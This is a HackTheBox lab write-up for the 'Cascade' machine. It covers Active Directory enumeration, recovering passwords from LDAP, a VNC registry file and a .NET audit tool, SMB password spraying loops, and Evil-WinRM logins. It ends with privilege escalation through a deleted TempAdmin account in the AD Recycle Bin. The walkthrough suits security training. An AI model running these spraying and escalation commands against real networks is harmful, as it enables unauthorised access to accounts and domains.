# Cascade - HackTheBox WriteUp

![info](/images/cascade/info.png) 

## Scanning & Information Gathering 

#### Scanning 

```
# Nmap 7.80 scan initiated Wed Apr  1 07:05:20 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /mnt/hgfs/pwn_share/Machines/cascade/results/10.10.10.182/scans/_full_tcp_nmap.txt -oX /mnt/hgfs/pwn_share/Machines/cascade/results/10.10.10.182/scans/xml/_full_tcp_nmap.xml 10.10.10.182
Nmap scan report for 10.10.10.182
Host is up, received user-set (0.054s latency).
Scanned at 2020-04-01 07:05:28 EDT for 323s
Not shown: 65520 filtered ports
Reason: 65520 no-responses
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2020-04-01 11:08:14Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%)

```

## Enumeration and Exploitation 

#### Service Enumeration 

##### 
53: DNS Add casecade.local to /etc/hosts. Then enumerate the DNS service 

``` dig axfr cascade.local @10.10.10.182 ``` 


No zone transfer and no new records discovered 

##### 88: Kerberos GetUserSPNs.py 

``` for i in $(cat /tmp/users.txt); do echo "Testing with: $i:$i"; python3 GetUserSPNs.py cascade.local/$i:$i;done ```


###### 445: SMB
  
Anonymous access allowed but can't list shares 
  
  
###### 135: RPC

**Enum4linux** 
Using enum4linux: 
``` enum4linux -a 10.10.10.182 ``` 

we find a list of users: CASC-DC1$ 
```
administrator krbtgt arksvc s.smith r.thompson util j.wakefield s.hickson j.goodhand a.turnbull e.crowe b.hanson d.burman BackupSvc j.allen i.croft CascGuest And group membership info: >[+] Getting local group memberships: Group 'IT' (RID: 1113) has member: CASCADE\arksvc Group 'IT' (RID: 1113) has member: CASCADE\s.smith Group 'IT' (RID: 1113) has member: CASCADE\r.thompson Group 'Data Share' (RID: 1138) has member: CASCADE\Domain Users Group 'Audit Share' (RID: 1137) has member: CASCADE\s.smith Group 'Remote Management Users' (RID: 1126) has member: CASCADE\arksvc Group 'Remote Management Users' (RID: 1126) has member: CASCADE\s.smith Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\krbtgt Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Controllers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Schema Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Enterprise Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Cert Publishers Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Domain Admins Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Group Policy Creator Owners Group 'Denied RODC Password Replication Group' (RID: 572) has member: CASCADE\Read-only Domain Controllers Group 'AD Recycle Bin' (RID: 1119) has member: CASCADE\arksvc Group 'HR' (RID: 1115) has member: CASCADE\s.hickson Group 'Domain Guests' (RID: 514) has member: CASCADE\CascGuest 
```

But nothing more interesting

###### 389: LDAP 

``` ldapsearch -h 10.10.10.182 -x -b "DC=cascade,DC=local" > ldap_out.txt ``` 

With some grep fu on the out file for strings like password, pass, pwd or just manually and patiently sifting through the file we find a base64 encryted string "cascadeLegacyPwd: **clk0bjVldmE=**" which returns the password "**rY4n5eva**" when decoded. 


Note you could also spot various base64 encoded objects when you start looking at the output file and just search for that pattern. ###### SMB Part 2 (with creds) 

``` smbclient -U'r.thompson%'rY4n5eva -L \\\\10.10.10.182\\ ```


 
 Pillaging as much info as we can We find an html file containing a note from a meeting which reveals information about a user account "**TempAdmin**". 



 We also find a VNC install file "**VNC Install.reg**" which contains the hex encryted password. 
 
 ![pillage_vnc_install](/images/cascade/pillage_vnc_install.png)
 
  Decoding from hex doesn't work and a google search reveals that VNC passwords are encrypted with a known salt and (1/3)DES. We find this tool https://github.com/trinitronx/vncpasswd.py and successfully crack the password
  
   ``` python ./vncpasswd.py -d -H '6bcf2a4b6e5aca0f' ``` Cannot read from Windows Registry on a Linux system Cannot write to Windows Registry on a Linux system Decrypted Bin Pass= '**sT333ve2**' Decrypted Hex Pass= '7354333333766532' 
   
  Authentication Login with TempAdmin and VNCPASS -- Failed 
   
   ##### Shell (User flag) 
   
   Test the password with all currently discovered users: 
   
   ``` for i in $(cat user.txt); do echo "testing with $i \n"; smbclient -L \\\\10.10.10.182\\ -U"$i%sT333ve2" ; done ``` 


Authenticated with user s.smith If you have a good memory and remembered that the VNC_Install file was found in "s.smith" directory during SMB part 2 Enumeration then you could have easily guessed the owner of the password, however, it is always good to test a discovered password with all known users in case of password repetition. 

Since port 5985 is open we try to authenticate using Evil-WinRM 

``` 
evil-winrm -i 10.10.10.182 -u s.smith -p sT333ve2 
``` 

Success! At this point the user flag can be read.


#### Post Exploitation

Enumeration After sometime enumerating the machine while logged in via Evil-WinRM and finding nothing interesting, we go back to the shares to see if we now have more access with this user. 

Running Smbmap we see we now have access to read data in the Audit$ share. Therefore, we copy and these files too to analyze them. 

![pillage_ssmith](/images/cascade/pillage_ssmith.png) 

Upon running strings on Audit.db we find a base64 encoded password for user ArkSvc. 

Ow==cascade.local 
> root@kali:~# echo -n "BQO5l5Kj9MdErXx6Q6AGOw==" | base64 -d && echo ������D�|zC�; root@kali:~# We don't get a plain text password. Moving on, we try running the "CascAudit.exe" program Running file on the exe shows it's a .Net Assembly program. 
>root@kali:/# file CascAudit.exe 
> CascAudit.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows 
 
Running strings on the executable doesn't give anything useful, therefore, we need to anaylyze it using a debuger such as DNSpy or ILSpy. Analyzing the executable using DNSpy, we open the exe and go to the main function. Right click on the executable and click "Go to Entry Point" 

This will take you to the main of the program. In the main Class we can see there is a SQL Lite authentication going on and the password derived by pulling the "Pwd" field in the Database and the decrypting it using the "DecryptString" method of the "Crypto" Class 

![sql_lite_con](/images/cascade/sql_lite_con.png) 

Double clicking on the DecryptString will take you to the Class where you can see how it's working. 

![decrypt_arksvc](/images/cascade/decrypt_arksvc.png)

 Scrolling up, you can also see the "EncryptString" class

 ![encrypt_arksvc](/images/cascade/encrypt_arksvc.png) Now we can easily do the same operation. Using an online .Net Compile like https://dotnetfiddle.net/ 

We can copy the main function and the decrypt function into one script and add the encrypted password and a print statement to display the decrypted password as shown below: 

![dotnet_fidler](/images/cascade/dotnet_fidler.png) 

We can also do the same decryption in CyberChef 

![chef_arksvc](/images/cascade/chef_arksvc.png) 

Now we have new credentials arksvc:w3lc0meFr31nd ## Privilege Escalation Testing out our new creds.
 
![evil_arksvc](/images/cascade/evil_arksvc.png) 

After some enumeration and finding nothing, we go back to our notes and remember the email note that talks about the TempAdmin. We try to authenticate using the ArkSvc password with Evil-WinRm and it fails. 

The email note says the account would be deleted at the end of 2018 and the output of strings on Audit.db also shows some delete actions on TempAdmin User. 

Googling Restore "Deleted AD User" and "Restore AD object" we get to this link which I have found very useful for pentesting AD. https://adsecurity.org/?p=51 

Following the instructions with a few logical tweaks to make it match what we are looking for ( user TempAdmin) 

>*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {SAMAccountName -like "TempAdmin"} 
*Evil-WinRM* PS C:\Users\arksvc\Documents> Get-ADObject -Filter {SAMAccountName -like "TempAdmin"} -IncludeDeletedObjects > 

>Deleted : True DistinguishedName : CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local Name : TempAdmin DEL:f0cc344d-31e0-4866-bceb-a842791ca059 ObjectClass : user ObjectGUID : f0cc344d-31e0-4866-bceb-a842791ca059

We can see the deleted user Further googling and reading showed this is a normal functionality provided by microsoft using the AD Recycle Bin. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/dd379509(v=ws.10)?redirectedfrom=MSDN 

Also, if we go back to our enum4linux output we remeber that ArkSVC is part of the "AD Recycle Bin" Group. This definetly has to be the way to escalate privilledge on this box 

![tempadmin_pass](/images/cascade/tempadmin_pass.png) 

Base64 decode the password: 

>root@kali:~# echo -n "YmFDVDNyMWFOMDBkbGVz" | base64 -d && echo **baCT3r1aN00dles** 

According to the notes the password of the TempAdmin user is the same as the normal admin account, therefore, let's try the password with the admin user. And we authenticate successfully 

![root](/images/cascade/root.png) 

**Conlusion:** This was an awesome ride, I learned a lot rooting this box, from ensuring proper enumeration, step by step note taking, simple reverse engineering and a new AD feature which can lead to privilege escalation. 

Top References: 
1. https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/the-ad-recycle-bin-understanding-implementing-best-practices-and/ba-p/396944# 
2. https://www.poweradmin.com/blog/restoring-deleted-objects-from-active-directory-using-ad-recycle-bin/ 
